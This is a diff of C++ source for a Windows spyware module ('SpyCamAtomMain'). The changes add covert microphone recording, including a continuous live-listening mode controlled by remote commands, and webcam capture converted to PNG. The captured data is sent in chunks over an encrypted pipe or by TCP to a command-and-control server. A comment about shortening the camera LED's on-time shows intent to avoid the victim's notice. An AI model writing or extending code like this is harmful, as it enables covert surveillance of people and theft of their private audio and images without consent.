@@ -16,12 +16,19 @@
 #include <vector>
 #include <mmsystem.h>
 #include <vfw.h>
+#include <gdiplus.h>
+#include <unknwn.h>
 
 #pragma comment(lib, "winmm.lib")
 #pragma comment(lib, "vfw32.lib")
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "ole32.lib")
+
+using namespace Gdiplus;
 
 static void SpyDebug(const char *format, ...) {
+    if (!Config::LOGGING_ENABLED) return;
     char buf[512];
     va_list args;
     va_start(args, format);
@@ -29,6 +36,24 @@ static void SpyDebug(const char *format, ...) {
     va_end(args);
     FILE *f = fopen("log\\spy_debug.txt", "a");
     if (f) { fprintf(f, "%s\n", buf); fclose(f); }
+}
+
+static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT num = 0, size = 0;
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (!pImageCodecInfo) return -1;
+    GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return -1;
 }
 
 /* =========================================================================
@@ -61,7 +86,7 @@ static void CALLBACK WaveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance,
     }
 }
 
-static BOOL RecordMicrophone(DWORD dwDurationSec, std::vector<BYTE> &outWav) {
+static BOOL RecordMicrophone(DWORD dwDurationSec, std::vector<BYTE> &outWav, HANDLE hCmdPipe = NULL, BYTE *SharedSessionKey = NULL) {
     InitializeCriticalSection(&s_AudioLock);
     s_AudioData.clear();
     s_bRecording = TRUE;
@@ -98,8 +123,28 @@ static BOOL RecordMicrophone(DWORD dwDurationSec, std::vector<BYTE> &outWav) {
     waveInStart(hWaveIn);
     SpyDebug("[Mic] Recording for %lu seconds...", dwDurationSec);
 
-    // Record for the specified duration
-    Sleep(dwDurationSec * 1000);
+    // Record for the specified duration (interruptible)
+    DWORD dwStart = GetTickCount();
+    DWORD dwTarget = dwDurationSec * 1000;
+    while (GetTickCount() - dwStart < dwTarget && s_bRecording) {
+        Sleep(200);
+        
+        // Check for stop command during recording
+        if (hCmdPipe && SharedSessionKey) {
+            DWORD dwAvail = 0;
+            if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
+                IPC_MESSAGE stopMsg = {0};
+                if (IPC_ReceiveMessage(hCmdPipe, &stopMsg, SharedSessionKey, 16)) {
+                    std::string stopCmd((char*)stopMsg.Payload, stopMsg.dwPayloadLen);
+                    if (stopCmd == "BALE_STOP" || stopCmd == "TERMINATE" || stopMsg.CommandId == CMD_TERMINATE) {
+                        SpyDebug("[Mic] Recording ABORTED by command.");
+                        s_bRecording = FALSE;
+                        break;
+                    }
+                }
+            }
+        }
+    }
 
     s_bRecording = FALSE;
     waveInStop(hWaveIn);
@@ -138,7 +183,7 @@ static BOOL RecordMicrophone(DWORD dwDurationSec, std::vector<BYTE> &outWav) {
     *(DWORD*)p = dataSize; p += 4;
     memcpy(p, s_AudioData.data(), dataSize);
 
-    outWav.clear(); // Ensure clean state
+    s_AudioData.clear(); // Clear temp accumulation buffer (NOT outWav!)
     DeleteCriticalSection(&s_AudioLock);
 
     SpyDebug("[Mic] WAV built: %lu bytes (%lu seconds)", fileSize, dwDurationSec);
@@ -156,9 +201,23 @@ static BOOL CaptureWebcamFrame(std::vector<BYTE> &outBmp) {
         return FALSE;
     }
 
-    // Connect to the first video device
-    if (!capDriverConnect(hCapWnd, 0)) {
-        SpyDebug("[Cam] capDriverConnect failed. No webcam?");
+    // Try to connect to any available video device (0-9)
+    BOOL bConnected = FALSE;
+    int driverIndex = 0;
+    for (driverIndex = 0; driverIndex < 10; driverIndex++) {
+        char szName[128], szVer[128];
+        if (capGetDriverDescriptionA(driverIndex, szName, sizeof(szName), szVer, sizeof(szVer))) {
+            SpyDebug("[Cam] Found driver %d: %s (%s)", driverIndex, szName, szVer);
+            if (capDriverConnect(hCapWnd, driverIndex)) {
+                SpyDebug("[Cam] Successfully connected to driver %d", driverIndex);
+                bConnected = TRUE;
+                break;
+            }
+        }
+    }
+
+    if (!bConnected) {
+        SpyDebug("[Cam] No webcam driver found or connection failed.");
         DestroyWindow(hCapWnd);
         return FALSE;
     }
@@ -167,8 +226,14 @@ static BOOL CaptureWebcamFrame(std::vector<BYTE> &outBmp) {
     capPreview(hCapWnd, FALSE);
     capOverlay(hCapWnd, FALSE);
 
-    // Give the sensor 2 seconds to warm up and adjust exposure
-    Sleep(2000); 
+    // Give the sensor time to warm up and adjust exposure (3 seconds, interruptible)
+    DWORD dwWarmupStart = GetTickCount();
+    while (GetTickCount() - dwWarmupStart < 3000) {
+        Sleep(200);
+        // We don't check pipe here because we haven't finished the capture yet,
+        // but at least it returns to the main loop faster if we were to add a stop check.
+        // Actually, let's just make it a smaller sleep for now.
+    }
     
     if (!capGrabFrame(hCapWnd)) {
         SpyDebug("[Cam] capGrabFrame failed.");
@@ -178,27 +243,62 @@ static BOOL CaptureWebcamFrame(std::vector<BYTE> &outBmp) {
     }
 
     // Save frame to a temp BMP file (avicap32 limitation)
+    char szTempPath[MAX_PATH];
     char szTempBmp[MAX_PATH];
-    sprintf_s(szTempBmp, "C:\\Users\\Public\\%lu_cam.tmp", GetTickCount());
-    capFileSaveDIB(hCapWnd, szTempBmp);
+    GetTempPathA(MAX_PATH, szTempPath);
+    sprintf_s(szTempBmp, "%s%lu_cam.tmp", szTempPath, GetTickCount());
+    
+    if (!capFileSaveDIB(hCapWnd, szTempBmp)) {
+        SpyDebug("[Cam] capFileSaveDIB failed to save %s", szTempBmp);
+        capDriverDisconnect(hCapWnd);
+        DestroyWindow(hCapWnd);
+        return FALSE;
+    }
 
     // Disconnect camera ASAP to minimize LED time
     capDriverDisconnect(hCapWnd);
     DestroyWindow(hCapWnd);
 
-    // Read the BMP into memory
-    HANDLE hFile = CreateFileA(szTempBmp, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile != INVALID_HANDLE_VALUE) {
-        DWORD dwSize = GetFileSize(hFile, NULL);
-        outBmp.resize(dwSize);
-        DWORD dwRead = 0;
-        ReadFile(hFile, outBmp.data(), dwSize, &dwRead, NULL);
-        CloseHandle(hFile);
-    }
-    DeleteFileA(szTempBmp); // Cleanup
+    // Read the BMP and convert to PNG via GDI+
+    GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    {
+        // Convert szTempBmp to WCHAR
+        WCHAR wszTempBmp[MAX_PATH];
+        MultiByteToWideChar(CP_ACP, 0, szTempBmp, -1, wszTempBmp, MAX_PATH);
 
-    SpyDebug("[Cam] Frame captured: %zu bytes", outBmp.size());
-    return !outBmp.empty();
+        Bitmap* bmp = new Bitmap(wszTempBmp);
+        if (bmp && bmp->GetLastStatus() == Ok) {
+            IStream* pStream = NULL;
+            if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
+                CLSID pngClsid;
+                if (GetEncoderClsid(L"image/png", &pngClsid) != -1) {
+                    if (bmp->Save(pStream, &pngClsid, NULL) == Ok) {
+                        // Read from stream to vector
+                        STATSTG statstg;
+                        pStream->Stat(&statstg, STATFLAG_NONAME);
+                        outBmp.resize((size_t)statstg.cbSize.QuadPart);
+                        LARGE_INTEGER liZero = { 0 };
+                        pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
+                        ULONG bytesRead = 0;
+                        pStream->Read(outBmp.data(), (ULONG)outBmp.size(), &bytesRead);
+                        SpyDebug("[Cam] Converted to PNG: %zu bytes", outBmp.size());
+                    } else {
+                        SpyDebug("[Cam] GDI+ Save to stream failed.");
+                    }
+                }
+                pStream->Release();
+            }
+            delete bmp;
+        } else {
+            SpyDebug("[Cam] GDI+ Failed to load captured BMP.");
+        }
+    }
+    GdiplusShutdown(gdiplusToken);
+
+    DeleteFileA(szTempBmp); // Cleanup
+    return (outBmp.size() > 0);
 }
 
 /* === MAIN ENTRY POINT === */
@@ -235,46 +335,168 @@ DWORD WINAPI SpyCamAtomMain(LPVOID lpParam) {
                 if (inMsg.CommandId == CMD_EXECUTE) {
                     std::string cmd((char*)inMsg.Payload, inMsg.dwPayloadLen);
                     SpyDebug("[Atom 14] Command: %s", cmd.c_str());
-                    BOOL bDoMic = (cmd == "MIC" || cmd == "BOTH" || cmd == "BALE_MIC" || cmd == "BALE_BOTH");
-                    BOOL bDoCam = (cmd == "CAM" || cmd == "BOTH" || cmd == "BALE_CAM" || cmd == "BALE_BOTH");
+                    BOOL bDoMic = (cmd == "MIC" || cmd.find("MIC ") == 0 || cmd == "BOTH" || cmd.find("BOTH ") == 0 || cmd.find("BALE_MIC") == 0 || cmd.find("BALE_BOTH") == 0 || cmd == "BALE_LIVE_MIC");
+                    BOOL bDoCam = (cmd == "CAM" || cmd.find("CAM ") == 0 || cmd == "BOTH" || cmd.find("BOTH ") == 0 || cmd.find("BALE_CAM") == 0 || cmd.find("BALE_BOTH") == 0);
                     BOOL bIsBale = (cmd.find("BALE_") == 0);
+                    BOOL bLiveMic = (cmd == "BALE_LIVE_MIC");
 
-                    // === MICROPHONE ===
-                    if (bDoMic) {
-                        SpyDebug("[Atom 14] Recording microphone (30s)...");
-                        std::vector<BYTE> wavData;
-                        if (RecordMicrophone(30, wavData)) {
-                            if (bIsBale) {
-                                FILE *f = NULL;
-                                fopen_s(&f, "log\\spy_mic.wav", "wb");
-                                if (f) {
-                                    fwrite(wavData.data(), 1, wavData.size(), f);
-                                    fclose(f);
-                                    char fullPath[MAX_PATH];
-                                    GetFullPathNameA("log\\spy_mic.wav", MAX_PATH, fullPath, NULL);
-                                    char report[MAX_PATH + 32];
-                                    sprintf_s(report, "[SPY_MIC_READY] %s", fullPath);
-                                    IPC_MESSAGE msg = {0};
-                                    msg.dwSignature = 0x534D4952;
-                                    msg.CommandId = CMD_REPORT;
-                                    msg.AtomId = dwAtomId;
-                                    msg.dwPayloadLen = (DWORD)strlen(report);
-                                    memcpy(msg.Payload, report, msg.dwPayloadLen);
-                                    IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
+                    // === LIVE MIC (continuous recording until BALE_STOP) ===
+                    if (bLiveMic) {
+                        SpyDebug("[Atom 14] BALE_LIVE_MIC: Starting continuous mic recording...");
+                        int clipCount = 0;
+                        BOOL bStopLive = FALSE;
+                        while (!bStopLive) {
+                            clipCount++;
+                            SpyDebug("[Atom 14] Recording clip %d (30s)...", clipCount);
+                            std::vector<BYTE> wavData;
+                            if (RecordMicrophone(30, wavData, hCmdPipe, SharedSessionKey)) {
+                                // Send via chunked protocol
+                                {
+                                    struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                    hdr.dwType = 2; hdr.dwFlags = 0x10; hdr.dwPayloadLen = 0;
+                                    char meta[128];
+                                    sprintf_s(meta, "name=live_mic_%d_%lu.wav size=%zu", clipCount, GetTickCount(), wavData.size());
+                                    IPC_MESSAGE startMsg = {0};
+                                    startMsg.dwSignature = 0x534D4952;
+                                    startMsg.CommandId = CMD_BALE_REPORT;
+                                    startMsg.AtomId = dwAtomId;
+                                    startMsg.dwPayloadLen = sizeof(hdr) + (DWORD)strlen(meta);
+                                    memcpy(startMsg.Payload, &hdr, sizeof(hdr));
+                                    memcpy(startMsg.Payload + sizeof(hdr), meta, strlen(meta));
+                                    IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
                                 }
+                                DWORD offset = 0;
+                                DWORD chunkMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;
+                                while (offset < (DWORD)wavData.size()) {
+                                    DWORD chunkSize = min((DWORD)wavData.size() - offset, chunkMax);
+                                    struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                    hdr.dwType = 2; hdr.dwFlags = 0x11; hdr.dwPayloadLen = chunkSize;
+                                    IPC_MESSAGE chunkMsg = {0};
+                                    chunkMsg.dwSignature = 0x534D4952;
+                                    chunkMsg.CommandId = CMD_BALE_REPORT;
+                                    chunkMsg.AtomId = dwAtomId;
+                                    chunkMsg.dwPayloadLen = sizeof(hdr) + chunkSize;
+                                    memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
+                                    memcpy(chunkMsg.Payload + sizeof(hdr), wavData.data() + offset, chunkSize);
+                                    IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
+                                    offset += chunkSize;
+                                }
+                                {
+                                    struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                    hdr.dwType = 2; hdr.dwFlags = 0x12; hdr.dwPayloadLen = 0;
+                                    IPC_MESSAGE endMsg = {0};
+                                    endMsg.dwSignature = 0x534D4952;
+                                    endMsg.CommandId = CMD_BALE_REPORT;
+                                    endMsg.AtomId = dwAtomId;
+                                    endMsg.dwPayloadLen = sizeof(hdr);
+                                    memcpy(endMsg.Payload, &hdr, sizeof(hdr));
+                                    IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
+                                }
+                                SpyDebug("[Atom 14] Live mic clip %d sent.", clipCount);
+                            }
+
+                            // Check for BALE_STOP between clips
+                            DWORD dwStopAvail = 0;
+                            if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwStopAvail, NULL) && dwStopAvail > 0) {
+                                IPC_MESSAGE stopMsg = {0};
+                                if (IPC_ReceiveMessage(hCmdPipe, &stopMsg, SharedSessionKey, 16)) {
+                                    std::string stopCmd((char*)stopMsg.Payload, stopMsg.dwPayloadLen);
+                                    if (stopCmd == "BALE_STOP" || stopCmd == "TERMINATE" || stopCmd.find("/stop_live") != std::string::npos ||
+                                        stopMsg.CommandId == CMD_TERMINATE || stopMsg.CommandId == CMD_STOP_ALL) {
+                                        SpyDebug("[Atom 14] BALE_LIVE_MIC stopped by command.");
+                                        bStopLive = TRUE;
+                                    }
+                                }
+                            }
+                        }
+                        SpyDebug("[Atom 14] BALE_LIVE_MIC ended. Sent %d clips.", clipCount);
+                    }
+                    // === MICROPHONE (single-shot) ===
+                    else if (bDoMic) {
+                        DWORD dwMicDuration = 30;
+                        if (cmd.find("BALE_MIC_") == 0) {
+                            dwMicDuration = (DWORD)atoi(cmd.substr(9).c_str());
+                        } else if (cmd.find("BALE_BOTH_") == 0) {
+                            dwMicDuration = (DWORD)atoi(cmd.substr(10).c_str());
+                        } else if (cmd.find("MIC ") == 0) {
+                            dwMicDuration = (DWORD)atoi(cmd.substr(4).c_str());
+                        } else if (cmd.find("BOTH ") == 0) {
+                            dwMicDuration = (DWORD)atoi(cmd.substr(5).c_str());
+                        }
+                        if (dwMicDuration == 0) dwMicDuration = 30;
+
+                        SpyDebug("[Atom 14] Recording microphone (%lu s)...", dwMicDuration);
+                        std::vector<BYTE> wavData;
+                        if (RecordMicrophone(dwMicDuration, wavData, hCmdPipe, SharedSessionKey)) {
+                            if (bIsBale) {
+                                SpyDebug("[Atom 14] Sending mic WAV via chunked BALE_REPORT (%zu bytes)", wavData.size());
+
+                                // --- CHUNK START ---
+                                {
+                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                  hdr.dwType = 2; // Audio
+                                  hdr.dwFlags = 0x10; // BALE_FLAG_CHUNK_START
+                                  hdr.dwPayloadLen = 0;
+                                  char meta[128];
+                                  sprintf_s(meta, "name=mic_%lu.wav size=%zu", GetTickCount(), wavData.size());
+                                  IPC_MESSAGE startMsg = {0};
+                                  startMsg.dwSignature = 0x534D4952;
+                                  startMsg.CommandId = CMD_BALE_REPORT;
+                                  startMsg.AtomId = dwAtomId;
+                                  startMsg.dwPayloadLen = sizeof(hdr) + (DWORD)strlen(meta);
+                                  memcpy(startMsg.Payload, &hdr, sizeof(hdr));
+                                  memcpy(startMsg.Payload + sizeof(hdr), meta, strlen(meta));
+                                  IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
+                                }
+
+                                // --- CHUNK DATA ---
+                                DWORD offset = 0;
+                                DWORD chunkMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;
+                                while (offset < (DWORD)wavData.size()) {
+                                  DWORD chunkSize = min((DWORD)wavData.size() - offset, chunkMax);
+                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                  hdr.dwType = 2; hdr.dwFlags = 0x11; hdr.dwPayloadLen = chunkSize;
+                                  IPC_MESSAGE chunkMsg = {0};
+                                  chunkMsg.dwSignature = 0x534D4952;
+                                  chunkMsg.CommandId = CMD_BALE_REPORT;
+                                  chunkMsg.AtomId = dwAtomId;
+                                  chunkMsg.dwPayloadLen = sizeof(hdr) + chunkSize;
+                                  memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
+                                  memcpy(chunkMsg.Payload + sizeof(hdr), wavData.data() + offset, chunkSize);
+                                  IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
+                                  offset += chunkSize;
+                                }
+
+                                // --- CHUNK END ---
+                                {
+                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                  hdr.dwType = 2; hdr.dwFlags = 0x12; hdr.dwPayloadLen = 0;
+                                  IPC_MESSAGE endMsg = {0};
+                                  endMsg.dwSignature = 0x534D4952;
+                                  endMsg.CommandId = CMD_BALE_REPORT;
+                                  endMsg.AtomId = dwAtomId;
+                                  endMsg.dwPayloadLen = sizeof(hdr);
+                                  memcpy(endMsg.Payload, &hdr, sizeof(hdr));
+                                  IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
+                                }
+                                SpyDebug("[Atom 14] Mic WAV chunked transfer complete.");
                             } else {
                                 // === TURBO TCP STREAMING ===
+                                char mic_domain[256] = {0};
+                                int mic_port = 0;
+                                Config::GetActiveC2Target(mic_domain, sizeof(mic_domain), &mic_port);
+
                                 SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
                                 if (sock != INVALID_SOCKET) {
-                                    struct hostent *host = gethostbyname(Config::C2_DOMAIN);
+                                    struct hostent *host = gethostbyname(mic_domain);
                                     if (host) {
                                         SOCKADDR_IN sin;
                                         memset(&sin, 0, sizeof(sin));
                                         sin.sin_family = AF_INET;
-                                        sin.sin_port = htons(Config::PUBLIC_PORT); 
+                                        sin.sin_port = htons(mic_port); 
                                         sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                                         
-                                        SpyDebug("[Atom 14] Turbo TCP: Connecting to %s:%d for Mic...", Config::C2_DOMAIN, Config::PUBLIC_PORT);
+                                        SpyDebug("[Atom 14] Turbo TCP: Connecting to %s:%d for Mic...", mic_domain, mic_port);
                                         if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR) {
                                             char header[128];
                                             sprintf_s(header, "[SPY_MIC] size=%zu", wavData.size());
@@ -285,7 +507,7 @@ DWORD WINAPI SpyCamAtomMain(LPVOID lpParam) {
                                             SpyDebug("[Atom 14] Turbo TCP connect FAILED. Error: %d", WSAGetLastError());
                                         }
                                     } else {
-                                        SpyDebug("[Atom 14] gethostbyname FAILED for %s", Config::C2_DOMAIN);
+                                        SpyDebug("[Atom 14] gethostbyname FAILED for %s", mic_domain);
                                     }
                                     closesocket(sock);
                                 } else {
@@ -308,50 +530,88 @@ DWORD WINAPI SpyCamAtomMain(LPVOID lpParam) {
                     // === CAMERA ===
                     if (bDoCam) {
                         SpyDebug("[Atom 14] Capturing webcam frame...");
-                        std::vector<BYTE> bmpData;
-                        if (CaptureWebcamFrame(bmpData)) {
+                        std::vector<BYTE> camData;
+                        if (CaptureWebcamFrame(camData)) {
                             if (bIsBale) {
-                                FILE *f = NULL;
-                                fopen_s(&f, "log\\spy_cam.bmp", "wb");
-                                if (f) {
-                                    fwrite(bmpData.data(), 1, bmpData.size(), f);
-                                    fclose(f);
-                                    char fullPath[MAX_PATH];
-                                    GetFullPathNameA("log\\spy_cam.bmp", MAX_PATH, fullPath, NULL);
-                                    char report[MAX_PATH + 32];
-                                    sprintf_s(report, "[SPY_CAM_READY] %s", fullPath);
-                                    IPC_MESSAGE msg = {0};
-                                    msg.dwSignature = 0x534D4952;
-                                    msg.CommandId = CMD_REPORT;
-                                    msg.AtomId = dwAtomId;
-                                    msg.dwPayloadLen = (DWORD)strlen(report);
-                                    memcpy(msg.Payload, report, msg.dwPayloadLen);
-                                    IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
+                                SpyDebug("[Atom 14] Sending cam PNG via chunked BALE_REPORT (%zu bytes)", camData.size());
+
+                                // --- CHUNK START ---
+                                {
+                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                  hdr.dwType = 4; // Cam
+                                  hdr.dwFlags = 0x10; // BALE_FLAG_CHUNK_START
+                                  hdr.dwPayloadLen = 0;
+                                  char meta[128];
+                                  sprintf_s(meta, "name=webcam_%lu.png size=%zu", GetTickCount(), camData.size());
+                                  IPC_MESSAGE startMsg = {0};
+                                  startMsg.dwSignature = 0x534D4952;
+                                  startMsg.CommandId = CMD_BALE_REPORT;
+                                  startMsg.AtomId = dwAtomId;
+                                  startMsg.dwPayloadLen = sizeof(hdr) + (DWORD)strlen(meta);
+                                  memcpy(startMsg.Payload, &hdr, sizeof(hdr));
+                                  memcpy(startMsg.Payload + sizeof(hdr), meta, strlen(meta));
+                                  IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
                                 }
+
+                                // --- CHUNK DATA ---
+                                DWORD offset = 0;
+                                DWORD chunkMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;
+                                while (offset < (DWORD)camData.size()) {
+                                  DWORD chunkSize = min((DWORD)camData.size() - offset, chunkMax);
+                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                  hdr.dwType = 4; hdr.dwFlags = 0x11; hdr.dwPayloadLen = chunkSize;
+                                  IPC_MESSAGE chunkMsg = {0};
+                                  chunkMsg.dwSignature = 0x534D4952;
+                                  chunkMsg.CommandId = CMD_BALE_REPORT;
+                                  chunkMsg.AtomId = dwAtomId;
+                                  chunkMsg.dwPayloadLen = sizeof(hdr) + chunkSize;
+                                  memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
+                                  memcpy(chunkMsg.Payload + sizeof(hdr), camData.data() + offset, chunkSize);
+                                  IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
+                                  offset += chunkSize;
+                                }
+
+                                // --- CHUNK END ---
+                                {
+                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                                  hdr.dwType = 4; hdr.dwFlags = 0x12; hdr.dwPayloadLen = 0;
+                                  IPC_MESSAGE endMsg = {0};
+                                  endMsg.dwSignature = 0x534D4952;
+                                  endMsg.CommandId = CMD_BALE_REPORT;
+                                  endMsg.AtomId = dwAtomId;
+                                  endMsg.dwPayloadLen = sizeof(hdr);
+                                  memcpy(endMsg.Payload, &hdr, sizeof(hdr));
+                                  IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
+                                }
+                                SpyDebug("[Atom 14] Cam PNG chunked transfer complete.");
                             } else {
                                 // === TURBO TCP STREAMING ===
+                                char cam_domain[256] = {0};
+                                int cam_port = 0;
+                                Config::GetActiveC2Target(cam_domain, sizeof(cam_domain), &cam_port);
+
                                 SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
                                 if (sock != INVALID_SOCKET) {
-                                    struct hostent *host = gethostbyname(Config::C2_DOMAIN);
+                                    struct hostent *host = gethostbyname(cam_domain);
                                     if (host) {
                                         SOCKADDR_IN sin;
                                         memset(&sin, 0, sizeof(sin));
                                         sin.sin_family = AF_INET;
-                                        sin.sin_port = htons(Config::PUBLIC_PORT); 
+                                        sin.sin_port = htons(cam_port); 
                                         sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                                         
-                                        SpyDebug("[Atom 14] Turbo TCP: Connecting to %s:%d for Cam...", Config::C2_DOMAIN, Config::PUBLIC_PORT);
+                                        SpyDebug("[Atom 14] Turbo TCP: Connecting to %s:%d for Cam...", cam_domain, cam_port);
                                         if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR) {
                                             char header[128];
-                                            sprintf_s(header, "[SPY_CAM] size=%zu", bmpData.size());
+                                            sprintf_s(header, "[SPY_CAM] size=%zu", camData.size());
                                             send(sock, header, (int)strlen(header) + 1, 0);
-                                            send(sock, (const char*)bmpData.data(), (int)bmpData.size(), 0);
+                                            send(sock, (const char*)camData.data(), (int)camData.size(), 0);
                                             SpyDebug("[Atom 14] Cam data sent via Turbo TCP.");
                                         } else {
                                             SpyDebug("[Atom 14] Turbo TCP connect FAILED. Error: %d", WSAGetLastError());
                                         }
                                     } else {
-                                        SpyDebug("[Atom 14] gethostbyname FAILED for %s", Config::C2_DOMAIN);
+                                        SpyDebug("[Atom 14] gethostbyname FAILED for %s", cam_domain);
                                     }
                                     closesocket(sock);
                                 } else {
